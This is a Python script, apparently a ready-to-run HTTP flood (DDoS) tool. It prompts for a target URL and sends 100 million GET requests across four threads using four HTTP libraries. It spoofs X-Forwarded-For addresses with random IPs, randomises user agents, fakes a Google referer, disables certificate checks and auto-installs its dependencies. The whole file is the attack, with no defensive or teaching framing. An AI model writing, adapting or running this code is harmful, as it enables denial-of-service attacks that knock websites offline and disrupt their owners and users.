import requests
import threading
import httpx
import aiohttp
import asyncio
from user_agent import generate_user_agent
from random import randint
import urllib3
import subprocess
import sys
import os
Almunharif1 = '\x1b[1;31m'  
Almunharif2 = '\x1b[1;32m'  
l=(f'''{Almunharif1}
        ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶           
      ¶¶¶¶¶¶     🧠       ¶¶¶¶¶¶         
     ¶¶¶¶¶                 ¶¶¶¶¶¶       
    ¶¶¶¶                     ¶¶¶¶¶      
   ¶¶¶¶                       ¶¶¶¶¶     
  ¶¶¶¶     ¶¶¶¶       ¶¶¶¶      ¶¶¶     
  ¶¶¶     ¶¶🔥¶¶     ¶¶🔥¶¶     ¶¶¶¶    
 ¶¶¶¶     ¶¶¶¶¶¶     ¶¶¶¶¶¶      ¶¶¶    
 ¶¶¶       ¶¶¶¶       ¶¶¶¶       ¶¶¶¶   
 ¶¶¶                              ¶¶¶   
 ¶¶¶                              ¶¶¶   
 ¶¶¶             🩸🩸              ¶¶¶   
 ¶¶¶            ¶¶¶¶¶            ¶¶¶¶   
 ¶¶¶¶        ¶¶¶¶¶¶¶¶¶¶¶         ¶¶¶    
  ¶¶¶      ¶¶¶¶¶     ¶¶¶¶¶      ¶¶¶¶    
  ¶¶¶¶    ¶¶¶           ¶¶¶    ¶¶¶¶     
   ¶¶¶¶   ¶¶     🚫       ¶¶   ¶¶¶¶      
    ¶¶¶¶                    ¶¶¶¶¶       
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶        
       ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                
''')
print(l)
required_libraries = [
    "requests",
    "threading",
    "httpx",
    "aiohttp",
    "asyncio",
    "user_agent",
    "urllib3"
]


def install_and_import(library):
    try:
        __import__(library)
    except ModuleNotFoundError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", library])
for lib in required_libraries:
    install_and_import(lib)
import requests
import threading
import httpx
import aiohttp
import asyncio
from user_agent import generate_user_agent
from random import randint
import urllib3
    
session = requests.Session()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def Almunharif_generate_ip():
    return f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"


def Almunharif_requests(target_url, Almunharif_num):
    Almunharif_session = requests.Session()
    for _ in range(Almunharif_num):
        Almunharif_headers = {
            'User-Agent': generate_user_agent(),
            'X-Forwarded-For': Almunharif_generate_ip(),
            'Referer': 'https://google.com',
            'Connection': 'keep-alive'
        }
        try:
            Almunharif_response = Almunharif_session.get(target_url, headers=Almunharif_headers, timeout=3, verify=False)
            print(f"{Almunharif2}Requests: Attack Sent | Status : {Almunharif_response.status_code} | Fake IP: {Almunharif_headers['X-Forwarded-For']}")
        except requests.exceptions.RequestException as Almunharif_error:
            print(f"{Almunharif1}Requests Error: {Almunharif_error}")


def Almunharif_httpx(target_url, Almunharif_num):
    with httpx.Client(verify=False) as Almunharif_client:
        for _ in range(Almunharif_num):
            Almunharif_headers = {
                'User-Agent': generate_user_agent(),
                'X-Forwarded-For': Almunharif_generate_ip(),
                'Referer': 'https://google.com',
                'Connection': 'keep-alive'
            }
            try:
                Almunharif_response = Almunharif_client.get(target_url, headers=Almunharif_headers, timeout=3)
                print(f"{Almunharif2}HTTPX: Attack Sent | Status : {Almunharif_response.status_code} | Fake IP: {Almunharif_headers['X-Forwarded-For']}")
            except httpx.RequestError as Almunharif_error:
                print(f"{Almunharif1}HTTPX Error: {Almunharif_error}")


async def Almunharif_aiohttp(target_url, Almunharif_num):
    Almunharif_connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=Almunharif_connector) as Almunharif_session:
        for _ in range(Almunharif_num):
            Almunharif_headers = {
                'User-Agent': generate_user_agent(),
                'X-Forwarded-For': Almunharif_generate_ip(),
                'Referer': 'https://google.com',
                'Connection': 'keep-alive'
            }
            try:
                async with Almunharif_session.get(target_url, headers=Almunharif_headers, timeout=3) as Almunharif_response:
                    print(f"{Almunharif2}AIOHTTP: Attack Sent | Status : {Almunharif_response.status} | Fake IP: {Almunharif_headers['X-Forwarded-For']}")
            except aiohttp.ClientError as Almunharif_error:
                print(f"{Almunharif1}AIOHTTP Error: {Almunharif_error}")


def Almunharif_urllib3(target_url, Almunharif_num):
    Almunharif_http = urllib3.PoolManager(cert_reqs='CERT_NONE')
    for _ in range(Almunharif_num):
        Almunharif_headers = {
            'User-Agent': generate_user_agent(),
            'X-Forwarded-For': Almunharif_generate_ip(),
            'Referer': 'https://google.com',
            'Connection': 'keep-alive'
        }
        try:
            Almunharif_response = Almunharif_http.request('GET', target_url, headers=Almunharif_headers, timeout=3)
            print(f"{Almunharif2}URLLIB3: Attack Sent | Status : {Almunharif_response.status} | Fake IP: {Almunharif_headers['X-Forwarded-For']}")
        except urllib3.exceptions.RequestError as Almunharif_error:
            print(f"{Almunharif1}URLLIB3 Error: {Almunharif_error}")


def Almunharif_ddos(target_url, Almunharif_num):
    Almunharif_num_per_library = Almunharif_num // 4

    Almunharif_threads = [
        threading.Thread(target=Almunharif_requests, args=(target_url, Almunharif_num_per_library)),
        threading.Thread(target=Almunharif_httpx, args=(target_url, Almunharif_num_per_library)),
        threading.Thread(target=Almunharif_urllib3, args=(target_url, Almunharif_num_per_library)),
        threading.Thread(target=lambda: asyncio.run(Almunharif_aiohttp(target_url, Almunharif_num_per_library)))
    ]

    for Almunharif_thread in Almunharif_threads:
        Almunharif_thread.start()

    for Almunharif_thread in Almunharif_threads:
        Almunharif_thread.join()

if __name__ == "__main__":
    
    Almunharif_url = input(f"{Almunharif2} URL: {Almunharif1}")
    Almunharif_total_requests = 100_000_000  
    Almunharif_ddos(Almunharif_url, Almunharif_total_requests)
